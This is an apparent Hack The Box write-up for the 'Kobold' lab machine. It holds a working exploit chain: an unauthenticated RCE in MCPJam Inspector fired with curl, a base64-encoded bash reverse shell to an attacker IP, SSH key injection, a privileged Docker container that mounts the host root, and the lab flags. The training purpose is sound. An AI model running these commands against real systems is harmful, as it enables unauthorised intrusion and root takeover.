# HTB Kobold - Easy Linux - Walkthrough

**IP:** 10.129.14.154  
**OS:** Linux (Ubuntu 24.04)  
**Difficulty:** Easy  
**Date:** 2026-06-07  
**Flags:**
- user.txt: `182b1f7241db7087a49952f403cf340f`
- root.txt: `dc8b903c53e3fefc61ac47d1e791886b`

---

## 1. Recon

Add to `/etc/hosts` first:
```
10.129.14.154  kobold.htb bin.kobold.htb mcp.kobold.htb
```

**nmap:**
```
22/tcp  open  ssh
80/tcp  open  http  (redirects to HTTPS)
443/tcp open  https
```

Curl `https://kobold.htb` → static landing page "Kobold Operations Suite", no app yet.

**vhost fuzzing** (filter on 302/154-byte wildcard response):
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -fs 154 -mc all -k
```
→ Found: `mcp.kobold.htb`

Browse `https://mcp.kobold.htb` → MCPJam Inspector web UI.

**Version identification** - search JS bundle for version string:
```bash
curl -sk https://mcp.kobold.htb/assets/index-*.js | grep -o '"MCPJam Inspector v[^"]*"'
```
→ `MCPJam Inspector v1.0.0`

**CVE check** → `searchsploit mcpjam` / GitHub search → **CVE-2026-23744**: pre-auth RCE in MCPJam Inspector ≤ 1.4.2.

---

## 2. Foothold - CVE-2026-23744 (MCPJam Inspector RCE)

**Vulnerability:** `/api/mcp/connect` accepts a `serverConfig` object and executes the specified `command` directly. No authentication required.

```bash
# Base64-encode the reverse shell
ENC=$(echo -n 'bash -i >& /dev/tcp/10.10.14.206/4444 0>&1' | base64)

# Start listener
nc -lvnp 4444 &

# Fire exploit
curl -sk -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"echo $ENC | base64 -d | bash\"],\"env\":{}},\"serverId\":\"pwned\"}"
```

Shell lands as `ben` in `/usr/local/lib/node_modules/@mcpjam/inspector`.

---

## 3. Stable Shell - SSH Key Injection

```bash
# Inject SSH public key via same RCE endpoint
CMD="mkdir -p /home/ben/.ssh && echo 'ssh-rsa AAAA...' >> /home/ben/.ssh/authorized_keys && chmod 700 /home/ben/.ssh && chmod 600 /home/ben/.ssh/authorized_keys"
ENC=$(python3 -c "import base64,sys; print(base64.b64encode(sys.argv[1].encode()).decode())" "$CMD")

curl -sk -X POST "https://mcp.kobold.htb/api/mcp/connect" \
  -H "Content-Type: application/json" \
  -d "{\"serverConfig\":{\"command\":\"/bin/bash\",\"args\":[\"-c\",\"echo $ENC | base64 -d | bash\"],\"env\":{}},\"serverId\":\"key\"}"

ssh -i ~/.ssh/id_rsa ben@10.129.14.154
```

**user.txt:** `182b1f7241db7087a49952f403cf340f`

---

## 4. Enumeration as ben

```
uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)
```

Key findings:
- `sudo --version` → 1.9.15p5 (vulnerable to CVE-2025-32463, but no sudoers rules for ben)
- **Docker installed**, socket at `/run/docker.sock` owned by `root:docker`
- `getent group docker` → `docker:x:111:alice` - alice is in docker group
- `docker ps` → permission denied (ben not in docker group... yet)

**Critical:** `newgrp docker` activates the docker group for the current session:

```bash
newgrp docker <<EOF
docker ps
EOF
```
→ Works! Ben is in the docker group but it wasn't in his active session groups.

---

## 5. Privilege Escalation - Docker Group Escape

**Available images (no internet on this box):**
```bash
newgrp docker <<EOF
docker images
EOF
```
```
REPOSITORY                    TAG       IMAGE ID
mysql                         latest    f66b7a288113
privatebin/nginx-fpm-alpine   2.0.2     f5f5564e6731
```

Mount the host filesystem using an existing image:
```bash
newgrp docker <<EOF
docker run --rm --entrypoint sh --user root --privileged \
  -v /:/host privatebin/nginx-fpm-alpine:2.0.2 \
  -c "cat /host/root/root.txt"
EOF
```

**root.txt:** `dc8b903c53e3fefc61ac47d1e791886b`

---

## 6. Full Chain Summary

```
vhost fuzz → mcp.kobold.htb
→ MCPJam Inspector v1.0.0
→ CVE-2026-23744: unauthenticated RCE via /api/mcp/connect
→ Shell as ben
→ newgrp docker (docker group, inactive until newgrp)
→ docker run --privileged -v /:/host (existing privatebin image)
→ root
```

---

## Key Lessons

1. **Identify software version immediately** - the moment you see an app name/version, check CVEs before digging into the API.
2. **`newgrp <group>`** - group membership in `/etc/group` may not be active in the current session. Always try `newgrp` if you see a privileged group like docker/lxd that ben is in but `id` doesn't show.
3. **Docker escape without internet** - `docker images` to find locally cached images; use any image with `--privileged -v /:/host --entrypoint sh`.
4. **`/etc/hosts` before scans** - add the target hostname before running anything; vhost-based routing won't work without it.
